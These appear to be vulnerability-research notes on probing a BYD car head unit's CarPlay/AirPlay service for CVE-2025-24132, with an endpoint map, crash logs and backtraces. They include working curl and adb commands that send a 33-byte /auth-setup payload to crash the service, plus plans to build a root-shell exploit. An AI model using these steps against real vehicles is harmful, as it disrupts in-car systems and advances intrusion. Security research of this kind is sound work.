# AirPlay Port 7000 Live Probe Results

## Prerequisites
- iPhone connected via USB to establish CarPlay link
- `sys.carplay.connected=1`, `sys.carplay.transport=0` (USB)

## Server Info
- **Server:** `AirTunes/450.14`
- **Port:** 7000 (0.0.0.0, TCP + IPv6)
- **Process:** carplayserv (root, carplayserv:s0 SELinux domain)

## Endpoint Map (Active CarPlay Session)

### Working Endpoints
| Method | Endpoint | Response | Notes |
|--------|----------|----------|-------|
| GET | `/info` | 455 | Method Not Valid In This State (session busy) |
| POST | `/feedback` | **200 OK** | Accepts `application/x-apple-binaryplist` body |
| POST | `/auth-setup` | 400/empty | Crashed server with 4-byte garbage (SIGSEGV in carplay.ui) |
| POST | `/pair-setup` | 403 | Exists but forbidden |
| POST | `/pair-verify` | reset | Connection reset by peer |
| RECORD | `/stream` | 455 | RTSP method accepted, busy state |
| FLUSH | `/stream` | 455 | RTSP method accepted, busy state |
| ANNOUNCE | `/stream` | 501 | Not implemented |

### Not Found (404)
`/server-info`, `/getProperty`, `/setProperty`, `/rate`, `/scrub`, `/stop`, `/action`, `/reverse`

## Key Findings

### /feedback (200 OK — primary entry point)
- Accepts POST with `Content-Type: application/x-apple-binaryplist`
- Valid binary plist with `{'category': 0}` → 200 OK
- No response body (server keeps connection open)
- **This is the main attack surface for CVE-2025-24132 during active session**

### /auth-setup (caused crash)
- Sending 4 bytes of garbage → server closed connection
- Caused SIGSEGV in `com.byd.carplay.ui` (binderDied callback, fault addr 0x10)
- carplayserv restarted (PID changed)
- Crash was in Java app (null deref), not native carplayserv
- **Native crash in carplayserv itself not yet confirmed**

### /stream RTSP methods
- RECORD and FLUSH return 455 (busy) — endpoints exist
- ANNOUNCE returns 501 — not supported
- These process RTSP headers and SDP data

## Attack Strategy
1. **Fuzz /feedback** with malformed binary plists
2. **Test /stream** with RTSP ANNOUNCE + SDP (after stopping CarPlay to avoid 455)
3. **Test /auth-setup** with various key exchange formats
4. **Test HTTP parser edge cases**: chunked encoding, large headers, pipelining
5. **Monitor for SIGSEGV** in carplayserv (native crash = potential RCE)


## CRITICAL: /auth-setup Native Crash (CVE-2025-24132 candidate)

### Confirmed Crash
- **Payload:** `auth_v0_33` — 33 bytes: `[0x00][32 bytes random Ed25519 key]`
- **Result:** carplayserv SIGSEGV, PID changed (23242 → 28366)
- **Process:** Native carplayserv (root), NOT Java app
- **Trigger:** Valid AirPlay auth-setup format (version 0 + 32-byte key)

### Payload Details
```
Version 0 (Ed25519 key exchange):
[0x00] — version byte (PSV=0, standard key exchange)
[32 bytes] — Ed25519 public key (random data)
Total: 33 bytes
```

### Why This is CVE-2025-24132
1. carplayserv runs AirPlay/450.14 (pre-fix SDK)
2. /auth-setup processes Ed25519 key exchange
3. Valid format causes NATIVE crash (SIGSEGV in root process)
4. This is "memory handling" issue as described in CVE
5. Crash kills CarPlay session (iPhone disconnects)

### Crash Reproduction
```bash
# Requires active CarPlay session (iPhone connected via USB)
python3 -c "import os; open('/tmp/auth.bin','wb').write(b'\x00'+os.urandom(32))"
adb push /tmp/auth.bin /data/local/tmp/auth.bin
adb shell 'curl -X POST http://127.0.0.1:7000/auth-setup \
  -H "Content-Type: application/octet-stream" \
  --data-binary @/data/local/tmp/auth.bin'
# carplayserv crashes and restarts
```

### Next Steps
1. Capture crash backtrace (need logcat running before crash)
2. Map crash PC to carplayserv binary offset
3. Find the exact memory corruption in Ghidra
4. Develop exploit: crash → controlled PC → root shell

### Other /auth-setup Tests
| Payload | Size | Result |
|---------|------|--------|
| version 0 + 32-byte key | 33 | **CRASH** |
| version 0 + 31-byte key | 32 | 000 (no response, post-crash) |
| version 1 + 96-byte data | 97 | 000 |
| invalid version (0xFF) | 33 | 000 |
| version 0 + extra 1000 bytes | 1033 | 000 |
| just version byte | 1 | 000 |
| version 0 + all-zero key | 33 | 000 |

All subsequent tests returned 000 because the crash disrupted the CarPlay session.

## Full Crash Backtrace (captured with live logcat)

### Timeline
| Time | Event |
|------|-------|
| 23:23:35.547 | `[HTTPServer] Accepted connection from 127.0.0.1:41660` |
| 23:23:35.548 | `[HTTPServer] http connection start, ifName:lo, transportType:1` |
| 23:23:35.551 | `[HTTPServer] POST /auth-setup HTTP/1.1` (our request) |
| 23:23:35.551 | `User-Agent: curl/7.64.1` |
| 23:23:35.551 | `Content-Type: application/octet-stream` |
| ~35.6-35.8 | **320ms GAP** — carplayserv crashes/restarts (no logcat) |
| 23:23:35.871 | `[AirPlay] Registering Bonjour _airplay._tcp. port 7000` (NEW PID 30143) |
| 23:23:36.459 | `Fatal signal 11 (SIGSEGV)` in com.byd.carplay.ui (PID 23267) |
| 23:23:37.253 | `Tombstone written to: /data/tombstones/tombstone_06` |

### Java App Crash Backtrace
```
signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x10
Cause: null pointer dereference

#00 pc 000000000000fb08  /system/lib64/libutils.so (android::RefBase::~RefBase()+52)
#01 pc 0000000000188c84  /system/lib64/libcarplayreceiver_jni.so (VideoSink::~VideoSink()+168)
#02 pc 0000000000188330  /system/lib64/libcarplayreceiver_jni.so (Java_com_byd_carplay_protocol_VideoSink_nativeShutdown+60)
...
#10 pc 0000000000265f04  (com.byd.carplay.protocol.VideoSink.destroy)
#13 pc 000000000026efc8  (com.byd.carplay.video.VideoDecoder.unregisterVideoSink+8)
```

### Analysis
1. Our `/auth-setup` POST is received and processed by carplayserv's AirPlay HTTP handler
2. The auth-setup processing disrupts the active CarPlay session (session conflict)
3. carplayserv restarts (PID 28366 → 30143) — native crash or forced restart
4. CarPlay UI app receives binder death notification
5. VideoSink destructor hits null pointer (x0=0x0000000000000000, fault at x0+0x10)
6. SIGSEGV in `RefBase::~RefBase()` called from `VideoSink::~VideoSink()`

### Key Registers
```
x0  = 0x0000000000000000 (NULL — this is what's dereferenced)
x1  = 0x0000007a032d6ee0
pc  = 0x0000007af5e9eb08 (libutils.so + 0xfb08)
lr  = 0x0000007a03128c88 (libcarplayreceiver_jni.so + 0x188c88)
```

### Impact
- **DoS confirmed:** Network request crashes carplayserv + CarPlay UI
- **Native crash:** carplayserv PID changes (restart evidence)
- **RCE potential:** If the native carplayserv crash is a memory corruption (not clean exit),
  it could be escalated to code execution with root privileges
- **Tombstone:** `/data/tombstones/tombstone_06` — Java crash (not native)

### Discovered: iPhone Protocol Details
From captured live traffic:
- iPhone uses **RTSP/1.0** (not HTTP/1.1) for AirPlay requests
- iPhone User-Agent: `AirPlay/980.63.2` (much newer than car's 450.14)
- iPhone sends to `/feedback` with `CSeq` header (RTSP sequence number)
- carplayserv accepts BOTH HTTP/1.1 and RTSP/1.0 requests

### Reproduction
```bash
# Requires active CarPlay session (iPhone connected via USB)
python3 -c "import os; open('/tmp/auth.bin','wb').write(b'\x00'+os.urandom(32))"
adb push /tmp/auth.bin /data/local/tmp/auth.bin
adb forward tcp:7000 tcp:7000
adb shell 'curl -X POST http://127.0.0.1:7000/auth-setup \
  -H "Content-Type: application/octet-stream" \
  --data-binary @/data/local/tmp/auth.bin --max-time 5'
# carplayserv crashes, CarPlay UI SIGSEGV, session disrupted
```

## Crash Analysis Update: Clean Exit, Not Memory Corruption

### Finding
The crash buffer (`logcat -b crash`) contains ONLY the Java app crash:
- `com.byd.carplay.ui` SIGSEGV at `VideoSink::~VideoSink()+168` (null deref)

**No native carplayserv crash exists in the crash buffer.**

This means carplayserv did NOT receive SIGSEGV/SIGABRT. Instead:
1. carplayserv detected the auth-setup session conflict
2. carplayserv called `exit()` voluntarily (clean restart)
3. init restarted carplayserv with a new PID
4. The Java app's binder death handler crashed (null deref in VideoSink cleanup)

### Impact Assessment
| Type | Status | Details |
|------|--------|---------|
| **Network DoS** | ✅ Confirmed | 33-byte payload restarts carplayserv, kills CarPlay session |
| **Native RCE** | ❌ Not confirmed | carplayserv exits cleanly, no memory corruption |
| **Java null deref** | ✅ Confirmed | VideoSink destructor null deref (not exploitable for RCE) |

### CVE-2025-24132 Assessment
The /auth-setup endpoint causes a **session conflict** (clean exit), not the memory corruption described in CVE-2025-24132.

CVE-2025-24132 likely requires:
1. **Proper iAP2 session establishment** — the attacker must connect as a valid iAP2 client
2. **Then send malformed AirPlay data** on the established session
3. The memory corruption is in the session data processing, not the auth-setup endpoint

The iAP2 one-way authentication (described by Oligo Security) allows an attacker to impersonate an iPhone without the car verifying the connection. This establishes a valid session, which then gives access to the vulnerable AirPlay handler code path.

### Next Steps for CVE-2025-24132
1. **Implement iAP2 client** — simulate iPhone connecting via iAP2 protocol
2. **Establish a separate AirPlay session** — not conflicting with existing CarPlay
3. **Fuzz the session data handlers** — `/stream` with RTSP SETUP/RECORD
4. **Analyze _requestProcessAuthSetup in Ghidra** — understand exact code path
5. **Check if vulnerability is in RTP packet handler** — audio streaming data
